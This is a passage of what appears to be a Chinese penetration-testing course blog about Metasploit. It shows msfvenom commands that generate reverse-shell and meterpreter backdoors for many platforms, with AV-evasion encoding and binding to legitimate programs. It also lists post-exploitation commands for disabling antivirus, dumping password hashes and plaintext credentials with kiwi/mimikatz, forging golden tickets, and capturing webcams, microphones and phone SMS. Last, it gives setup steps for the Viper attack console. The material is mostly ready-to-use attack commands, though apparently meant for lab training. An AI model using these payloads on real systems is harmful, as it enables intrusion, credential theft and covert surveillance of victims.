lhost 192.168.70.3</code></p><p><code>set lport  4444</code>端口</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/ad204b7bb1bc4c709f4d6948d4ef219a.png" alt="img"> </p><h3 id="3-生成php后门执行攻击获得meterpreter"><a href="#3-生成php后门执行攻击获得meterpreter" class="headerlink" title="3 生成php后门执行攻击获得meterpreter"></a>3 生成php后门执行攻击获得meterpreter</h3><h4 id="3-1生成PHP后门"><a href="#3-1生成PHP后门" class="headerlink" title="3.1生成PHP后门"></a>3.1生成PHP后门</h4><p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.70.3 lport=4444 R&gt;shell.php</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1fa4967afb3f487f84926004d4ddc591.png" alt="img"></p><h4 id="3-2-传播"><a href="#3-2-传播" class="headerlink" title="3.2 传播"></a>3.2 传播</h4><p>使用Python简单的web服务</p><p><code>python3 -m http.server 80</code></p><p>或</p><p><code>python -m SimpleHTTPServer 80</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/6604546c76d7471e9f332e81daf6c570.png" alt="img"></p><p>靶机将shell.php使用<strong>文件上传</strong>的方式上传</p><p>然后访问</p><p><code>192.168.70.130:8084/hackable/uploads/shell.php</code></p><p>触发运行。</p><h4 id="3-3-执行攻击获得meterpreter"><a href="#3-3-执行攻击获得meterpreter" class="headerlink" title="3.3 执行攻击获得meterpreter"></a>3.3 执行攻击获得meterpreter</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1003035b32a343488a282bddec48a62b.png" alt="img"></p><p><code>run</code> 或者<code>exploit</code></p><p>获取到meterpreter 我们就可以做渗透操作了</p><h5 id="观看屏幕"><a href="#观看屏幕" class="headerlink" title="观看屏幕"></a>观看屏幕</h5><p><code>run vnc</code></p><h5 id="查看当前账号"><a href="#查看当前账号" class="headerlink" title="查看当前账号"></a>查看当前账号</h5><p><code>getuid</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/12-meterpreter-jie-shao/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/12-meterpreter-jie-shao/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-Meterpreter是什么"><a href="#一、-Meterpreter是什么" class="headerlink" title="一、 Meterpreter是什么"></a>一、 Meterpreter是什么</h1><p>Meterpreter是Metasploit框架中的一个利器，作为漏洞溢出后的<strong>攻击载荷</strong>使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程执行命令!<br>Metasploit提供了各个主流平台的Meterpreter版本，包括Windows、Linux，同时支持x86、x64平台，另外，Meterpreter还提供了基于PHP和Java语言的实现。Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter还支持Ruby脚本形式的扩展。所以Ruby语言还很有必要了解下。</p><h1 id="二、Meterpreter中常用的反弹类型"><a href="#二、Meterpreter中常用的反弹类型" class="headerlink" title="二、Meterpreter中常用的反弹类型"></a>二、Meterpreter中常用的反弹类型</h1><p>1.reverse_tcp<br>这是一个基于TCP的反向链接反弹shell, 使用起来很稳定</p><h1 id="三、Meterpreter的常用命令"><a href="#三、Meterpreter的常用命令" class="headerlink" title="三、Meterpreter的常用命令"></a>三、Meterpreter的常用命令</h1><h2 id="1-基本命令"><a href="#1-基本命令" class="headerlink" title="1.基本命令"></a>1.基本命令</h2><p><code>help</code># 查看Meterpreter帮助</p><p><code>background</code>#返回，把meterpreter后台挂起<br><code>bgkill</code># 杀死一个 meterpreter 脚本<br><code>bglist</code>#提供所有正在运行的后台脚本的列表<br><code>bgrun</code>#作为一个后台线程运行脚本<br><code>channel</code>#显示活动频道<br><code>sessions -i number</code> # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用<br><code>sesssions -k  number</code> #与会话进行交互<br><code>close</code># 关闭通道<br><code>exit</code># 终止 meterpreter 会话<br><code>quit</code># 终止 meterpreter 会话<br><code>interact id</code> #切换进一个信道<br> <code>run</code>#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等<br> <code>irb</code># 进入 Ruby 脚本模式<br> <code>read</code># 从通道读取数据write# 将数据写入到一个通道<br> run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本<br><code>use</code># 加载 meterpreter 的扩展<br><code>load/use</code>#加载模块<br> <code>Resource</code>#执行一个已有的rc脚本</p><h2 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2  常用命令"></a>2  常用命令</h2><h3 id="2-1-针对安卓手机的一些命令"><a href="#2-1-针对安卓手机的一些命令" class="headerlink" title="2.1 针对安卓手机的一些命令"></a>2.1 针对安卓手机的一些命令</h3><p>获取手机通讯录： <code>dump_contacts</code></p><p>获取短信记录：<code>dump_sms</code></p><p>控制实验手机发短信：<code>send_sms -d 15330252525 -t "hello"</code></p><p>获取实验手机GPS定位信息：<code>geolocate</code></p><p>获取实验手机Wi-Fi定位信息：<code>wlan_geolocate</code></p><p>控制实验手机录音：<code>record_mic -d  5</code></p><p>获取实验手机相机设备：<code>webcam_list</code></p><p>控制实验手机拍照 ：<code>webcam_snap</code></p><p>直播实验手机摄像头：<code>webcam_stream</code></p><h3 id="2-2-针对Windows的一些命令"><a href="#2-2-针对Windows的一些命令" class="headerlink" title="2.2 针对Windows的一些命令"></a>2.2 针对Windows的一些命令</h3><p>查看进程：<code>ps</code></p><p>查看当前进程号：<code>getpid</code></p><p>查看<strong>系统信息</strong>：<code>sysinfo</code></p><p>查看目标机是否为虚拟机：</p><p><code>run post/windows/gather/checkvm</code></p><p>查看完整网络设置：<code>route</code></p><p>查看<strong>当前权限</strong>：<code>getuid</code></p><p>自动提权：<code>getsystem</code></p><p>关闭杀毒软件：<code>run post/windows/manage/killav</code></p><p>启动远程桌面协议：<code>run post/windows/manage/enable_rdp</code></p><p>列举当前登录的用户：</p><p><code>run post/windows/gather/enum_logged_on_users</code></p><p>查看当前应用程序：</p><p><code>run post/windows/gather/enum_applications</code></p><p>抓取目标机的<strong>屏幕截图</strong>：<code>load espia</code> ； <code>screengrab</code></p><p>获取相机设备：<code>webcam_list</code></p><p>控制拍照 ：<code>webcam_snap</code></p><p><strong>直播摄像头</strong>：<code>webcam_stream</code></p><p> <strong>观看屏幕</strong>：<code>run vnc</code></p><p>控制录音：<code>record_mic</code></p><p>查看<strong>当前目录</strong>：<code>pwd</code></p><p>查看当前目录：<code>getlwd</code></p><p>导出<strong>当前用户密码哈希</strong>  <code>run hashdump</code></p><p>用户名：SID：LM哈希：NTLM哈希:::</p><p>也可以使用下面这个命令导出 权限更高   </p><p><code>run windows/gather/smart_hashdump</code></p><p>抓取<strong>自动登录的用户名和密码</strong>  </p><p><code>run windows/gather/credentials/windows_autologin</code></p><p>直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入getsystem）</p><p>首选终端输入  <code>load kiwi</code>    加载kiwi</p><p><code>creds_all</code>：列举所有凭据<br><code>creds_kerberos</code>：列举所有kerberos凭据<br><code>creds_msv</code>：列举所有msv凭据<br><code>creds_ssp</code>：列举所有ssp凭据<br><code>creds_tspkg</code>：列举所有tspkg凭据<br><code>creds_wdigest</code>：列举所有wdigest凭据<br><code>dcsync</code>：通过DCSync检索用户帐户信息<br><code>dcsync_ntlm</code>：通过DCSync检索用户帐户NTLM散列、SID和RID<br><code>golden_ticket_create</code>：创建黄金票据<br><code>kerberos_ticket_list</code>：列举kerberos票据<br><code>kerberos_ticket_purge</code>：清除kerberos票据<br><code>kerberos_ticket_use</code>：使用kerberos票据<br><code>kiwi_cmd</code>：执行mimikatz的命令，后面接mimikatz.exe的命令<br><code>lsa_dump_sam</code>：dump出lsa的SAM<br><code>lsa_dump_secrets</code>：dump出lsa的密文<br><code>password_change</code>：修改密码<br><code>wifi_list</code>：列出当前用户的wifi配置文件<br><code>wifi_list_shared</code>：列出共享wifi配置文件/编码</p><h2 id="3-文件系统命令"><a href="#3-文件系统命令" class="headerlink" title="3.文件系统命令"></a>3.文件系统命令</h2><p>cat c:\boot.ini#查看文件内容,文件必须存在<br>del c:\boot.ini #删除指定的文件<br>upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\windows\system32<br>download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295****<em><em>125\Msg2.0.db /root/<br>edit c:\boot.ini  # 编辑文件<br>getlwd#打印本地目录<br>getwd#打印工作目录<br>lcd#更改本地目录<br>ls#列出在当前目录中的文件列表<br>lpwd#打印本地目录<br>pwd#输出工作目录<br>cd c:\ #进入目录文件下<br>rm file #删除文件<br>mkdir dier #在受害者系统上的创建目录<br>rmdir#受害者系统上删除目录<br>dir#列出目标主机的文件和文件夹信息<br>mv#修改目标主机上的文件名<br>search -d d:\www -f web.config #search 文件，如search  -d c:\  -f</em>.doc<br>meterpreter &gt; search -f autoexec.bat  #搜索文件<br>meterpreter &gt; search -f sea</em>.bat c:\xamp\<br>enumdesktops     #用户登录数</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/08-09-msfvenom-chang-yong-can-shu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/08-09-msfvenom-chang-yong-can-shu/</url>
      
        <content type="html"><![CDATA[<p>Kali中的 <code>msfvenom</code> 取代了msfpayload和msfencode，常用于生成后门木马</p><p>msfpayload是MSF攻击荷载生成器，用于生成shellcode和可执行代码。<br>msfencode是MSF编码器。</p><hr><h1 id="一-、msfvenom-常用参数"><a href="#一-、msfvenom-常用参数" class="headerlink" title="一 、msfvenom 常用参数"></a>一 、msfvenom 常用参数</h1><p><code>-l</code><br>列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</p><p><code>-p</code><br>指定需要使用的payload(<strong>攻击荷载</strong>)。</p><p><code>-f</code><br>指定<strong>输出格式</strong></p><p>Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；</p><p>Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；</p><p><code>-e</code><br>指定需要使用的encoder（编码器）<strong>编码免杀</strong>。</p><p><code>-a</code><br>指定payload的<strong>目标架构</strong></p><p>选择架构平台:x86 | x64 | x86_64<br><strong>Platforms</strong>:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</p><p><code>-o</code><br><strong>保存</strong>payload文件输出。</p><p><code>-b</code><br>设定<strong>规避字符集</strong>，比如: ‘\x00\xff’避免使用的字符</p><p><code>-n</code><br>为payload预先指定一个NOP<strong>滑动长度</strong></p><p><code>-s</code><br>设定有效攻击荷载的<strong>最大长度</strong>生成payload的最大长度，就是文件大小。</p><p><code>-i</code><br>指定payload的<strong>编码次数</strong></p><p><code>-c</code><br>指定一个<strong>附加</strong>的win32 shellcode<strong>文件</strong></p><p><code>-x</code><br>指定一个自定义的可执行文件作为模板<br>例如：原先有个正常文件normal.exe 可以通过这个选项把后门<strong>捆绑到</strong>这个<strong>程序</strong>上面。</p><p><code>-k</code><br>保护模板程序的动作，注入的payload作为一个新的进程运行<br>例如：原先有个正常文件normal.exe 可以通过这个选项把后门<strong>捆绑到这个程序</strong>上面。</p><p><code>-v</code><br>指定一个<strong>自定义的变量</strong>，以确定输出格式</p><hr><h1 id="二、各平台生成payload命令"><a href="#二、各平台生成payload命令" class="headerlink" title="二、各平台生成payload命令"></a>二、各平台生成payload命令</h1><hr><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 10  -f exe -o payload.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目标框架x86,平台windows,攻击载荷windows/meterpreter/reverse_tcp,监听主机192.168.70.3，端口4444，免杀编码x86/shikata_ga_nai，规避字符集’\x00\x0a\xff’，编码10次，输出exe文件，输出文件名叫payload.exe。</p><p>简易的：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.70.3 lport=4444 -f exe &gt;shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.70.3 LPORT=4444 -f macho -o payload.macho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567  -o payload.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 -f elf -o payload.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1  LPORT=8888  -f raw &gt; shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="war"><a href="#war" class="headerlink" title="war"></a>war</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="windows-shellcode"><a href="#windows-shellcode" class="headerlink" title="windows shellcode"></a>windows shellcode</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="linux-shellcode"><a href="#linux-shellcode" class="headerlink" title="linux shellcode"></a>linux shellcode</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="mac-shellcode"><a href="#mac-shellcode" class="headerlink" title="mac shellcode"></a>mac shellcode</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp  LHOST=192.168.1.1  LPORT=4567 -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/07-metasploit-de-he-xin-mo-kuai-modules/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/07-metasploit-de-he-xin-mo-kuai-modules/</url>
      
        <content type="html"><![CDATA[<p>msf的模块都放在</p><p>/usr/share/metasploit-framework/modules/这个目录下</p><p><code>cd /usr/share/metasploit-framework/modules/</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1640748958000/9e03e3c4dbc548d7b38c0389b1f131ab.png" alt="image.png"></p><p>1 <code>auxiliary</code>:辅助模块，辅助渗透(端口扫描、登录密码爆破、漏洞验证等)</p><p>2 <code>exploits</code>:漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。</p><p>3 <code>payloads</code>:攻击载荷，主要是攻击成功后在目标机器执行的代码,比如反弹shell的代码</p><p>4 <code>post</code>:后渗透阶段模块，漏洞利用成功获得meterpreter之后， 向目标发送的一些功能性指令,如:提权等</p><p>5 <code>encoders</code>: 编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统</p><p>6 <code>evasion</code>:躲避模块，用来生成免杀payload</p><p>7 <code>nops</code>:这里主要放着调整shellcode 前置nop指令长度的工具（不理解没关系）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/06-msf-mu-lu-jie-gou/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/06-msf-mu-lu-jie-gou/</url>
      
        <content type="html"><![CDATA[<h1 id="MSF目录结构"><a href="#MSF目录结构" class="headerlink" title="MSF目录结构"></a>MSF目录结构</h1><p>kali终端中输</p><p><code>cd /usr/share/metasploit-framework</code></p><p>然后输入 <code>ls</code> 查看</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/1abfa994573e4ec1b283aea5ecb809d3.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/13fa9f11a9b540f7a15854b67186ae99.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/15e181b7c7534f549cbbcb249121acb5.png" alt="image.png"></p><h1 id="要记住的一些模块"><a href="#要记住的一些模块" class="headerlink" title="要记住的一些模块"></a>要记住的一些模块</h1><p><code>modules</code>：目录里面存放渗透使用的  辅助模块;编码模块;利用模块;攻击载荷;后渗透模块…</p><p><code>plugins</code>： 这个模块需要用load加载，主要提供数据库连接插件 和 各种要用到的插件。</p><p><code>tools</code>：包含一些有用的脚本和零散的工具。</p><p><code>scripts</code>：目录里面存放都是meterpreter利用的脚本。</p><p><code>db</code>：数据放在这个目录里</p><p><code>data</code>：存放使用到的文件，比如密码字典、meterpreter、passivex、vnc、dlls等工具和一些用户接口代码，msfweb和一些其他模块用到的数据文件</p><p><code>lib</code>：库文件都保存在这个目录里</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/05-msf-tu-xing-jie-mian-viper/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/05-msf-tu-xing-jie-mian-viper/</url>
      
        <content type="html"><![CDATA[<p><strong>MSF图形化界面Viper(炫彩蛇)下载与使用</strong></p><p>Viper是一款图形化内网渗透工具,将内网渗透过程中常用的战术及技术进行模块化及武器化.</p><p>集成杀软绕过,内网隧道,文件管理,命令行等基础功能.</p><p>当前已集成70+个模块,覆盖初始访问/持久化/权限提升/防御绕过/凭证访问/信息收集/横向移动等大类.</p><p><strong>在Kali Linux上安装Docker</strong></p><pre class="line-numbers language-none"><code class="language-none">apt-get update#使用apt安装docker apt-get install -y docker.io #设置开机启动 systemctl start docker#检查启动状态 docker version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​              </p><p><img src="/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043246556.png" alt="1640043246556"></p><p> <strong>安装docker-compose</strong></p><pre class="line-numbers language-none"><code class="language-none">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` &gt; /usr/bin/docker-compose#给赋可执行状态 chmod +x /usr/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043297604.png" alt="1640043297604"></p><pre class="line-numbers language-none"><code class="language-none">#设置安装目录export VIPER_DIR=/root/VIPER#执行如下命名生成安装目录,并进入安装目录 mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​              </p><p><img src="/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043341743.png" alt="1640043341743"></p><p><strong>执行如下命令生成docker-compose.yml</strong></p><p>如果你看到的命令是乱的  <a href="https://note.youdao.com/s/GdzSJnWD">https://note.youdao.com/s/GdzSJnWD</a>  看这个文档</p><pre class="line-numbers language-none"><code class="language-none">tee docker-compose.yml &lt;&lt;-'EOF'version: "3"services:  viper:  image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest    container_name: viper-c    network_mode: "host"    restart: always    volumes:      - ${PWD}/loot:/root/.msf4/loot      - ${PWD}/db:/root/viper/Docker/db      - ${PWD}/module:/root/viper/Docker/module      - ${PWD}/log:/root/viper/Docker/log      - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig    command: ["VIPER_PASSWORD"]EOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​              </p><p><img src="/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043385926.png" alt="1640043385926"></p><p><strong>设置登录密码</strong></p><p>Viper不允许使用默认密码,diypassword替换为自定义密码密码</p><pre class="line-numbers language-none"><code class="language-none">export VIPER_PASSWORD=root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​              </p><p><img src="/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043439186.png" alt="1640043439186"></p><p><strong>写入密码到docker-compose.yml</strong></p><pre class="line-numbers language-none"><code class="language-none">sed -i "s/VIPER_PASSWORD/$VIPER_PASSWORD/g" docker-compose.yml#使用命令查看一下配置 cat docker-compose.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​                </p><p><img src="/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043478861.png" alt="1640043478861"></p><p><strong>创建启动Viper</strong></p><pre class="line-numbers language-none"><code class="language-none">cd $VIPER_DIRdocker-compose up -d #或者#启动viperdocker-compose start    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>启动Viper 时，执行</p><p>docker-compose up -d</p><p>会遇到“ERROR: Get “<a href="https://registry.cn-shenzhen.aliyuncs.com/v2/">https://registry.cn-shenzhen.aliyuncs.com/v2/</a>“: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)”的报错，这里的解决方案是<strong>修改DNS服务</strong>。具体操作如下：</p><p><code>vim /etc/resolv.conf</code></p><p><strong>将dns修改为8.8.8.8</strong>，</p><p>即将 nameserver 后面的DNS地址改为<code>8.8.8.8</code></p><p>重启docker 服务</p><p><code>systemctl restart docker</code></p><p>然后进入到安装目录，$VIPER_DIR表示你的安装viper的目录</p><p><code>cd $VIPER_DIR</code></p><p>然后执行</p><p><code>docker-compose up -d</code><br>顺利启动</p></blockquote><p><img src="/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043509764.png" alt="1640043509764"></p><p>**等待15s系统启动,访问炫彩蛇 **</p><ul><li><code>https://192.168.70.3:60000</code></li><li>登录. 用户名:root </li><li>密码: root</li></ul><p><img src="/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043540568.png" alt="1640043540568"></p><p><strong>注意：</strong></p><p><strong>所有的docker-compose命令必须在安装目录执行才会有效果</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/04-windows-an-zhuang-msf/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/04-windows-an-zhuang-msf/</url>
      
        <content type="html"><![CDATA[<h1 id="1-下载metasploit"><a href="#1-下载metasploit" class="headerlink" title="1  下载metasploit"></a>1  下载metasploit</h1><p> 首先咱们进入metasploit官网</p><p><a href="https://www.metasploit.com/">https://www.metasploit.com/</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/de0dfa24cf144e319e9817208d796e67.png" alt="image.png"></p><p>点击 Download  下载</p><p>或者直接访问这个 地址</p><p><a href="https://www.metasploit.com/download">https://www.metasploit.com/download</a></p><p>进入这个页面  点击 Metasploit Framework  下面的 Download</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/40c70142eedd4ee7b6a132a84426dd1f.png" alt="image.png"></p><p>会访问这个地址</p><p><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers</a></p><p>如果你不能打开GitHub 我们可以通过镜像服务器 访问</p><p><a href="https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers">https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/a6096a53fc0f411fa7d4a1ecb32bea1a.png" alt="image.png"></p><p>这边给大家提供更多的国内可用镜像</p><p>#官网镜像（可以用来clone push等,但是不能登录）</p><p><a href="https://github.com.cnpmjs.org/">https://github.com.cnpmjs.org/</a><br><a href="https://git.sdut.me/">https://git.sdut.me/</a></p><p>#github常用的镜像</p><p><a href="https://hub.fastgit.org/">https://hub.fastgit.org</a></p><p><a 